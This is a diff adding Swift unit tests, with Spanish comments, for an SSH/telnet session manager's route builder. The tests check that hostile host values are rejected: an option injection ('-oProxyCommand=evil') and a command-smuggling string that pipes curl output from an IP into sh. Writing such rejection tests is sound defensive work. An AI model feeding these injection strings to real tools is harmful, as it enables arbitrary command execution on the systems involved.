@@ -101,6 +101,27 @@ private let config = """
         #expect(r.command.arguments == ["-t", "tu.usuario@192.0.2.1", "telnet", "192.0.2.21"])
     }
 
+    @Test func conectarSinGuardarVaExplicito() throws {
+        var s = EditableSession.new(group: "Core", name: "prueba-01")
+        s.host = "198.51.100.7"
+        s.user = "tu.usuario"
+        s.port = "2200"
+        s.jump = "bastion"
+        let r = try manager.route(unsaved: s)
+        #expect(r.alias == nil && r.sessionName == nil)
+        #expect(r.command.arguments == ["-J", "tu.usuario@192.0.2.1", "-p", "2200", "-l", "tu.usuario", "198.51.100.7"])
+        // (sin salto: ssh directo; y nada que empiece por «-» llega como opción)
+        s.jump = ""
+        #expect(try manager.route(unsaved: s).command.arguments == ["-p", "2200", "-l", "tu.usuario", "198.51.100.7"])
+        s.host = "-oProxyCommand=evil"
+        #expect(throws: RouteError.self) { try manager.route(unsaved: s) }
+        // (telnet con salto: el equipo se escribe en la shell del salto)
+        s.kind = .telnet
+        s.jump = "bastion"
+        s.host = "x;curl${IFS}198.51.100.9|sh"
+        #expect(throws: RouteError.self) { try manager.route(unsaved: s) }
+    }
+
     @Test func bucleDeSaltos() {
         let m = SessionManager(profiles: [SessionProfile(name: "a", proxyJump: ["b"]), SessionProfile(name: "b", proxyJump: ["a"])])
         #expect(throws: RouteError.loop("a")) { try m.route(to: m.profile(named: "a")!) }
@@ -110,6 +131,10 @@ private let config = """
         let m = SessionManager()
         let malo = SSHConfigParser().parse("Host -oProxyCommand=evil\n  HostName 192.0.2.1\nHost x\n  HostName -oProxyCommand=evil\n")
         for p in malo { #expect(throws: RouteError.self) { try m.route(to: p) } }
+        // (tampoco por un salto: la sesión del salto con un equipo que empieza por «-»)
+        let salto = SessionManager(profiles: SSHConfigParser().parse(
+            "Host malo\n  HostName -oProxyCommand=evil\nHost olt\n  HostName 192.0.2.21\n  ProxyJump malo\n  # @telnet\n"))
+        #expect(throws: RouteError.badJump("malo")) { try salto.route(to: salto.profile(named: "olt")!) }
     }
 
     @Test func candidatasConSusDuenos() throws {
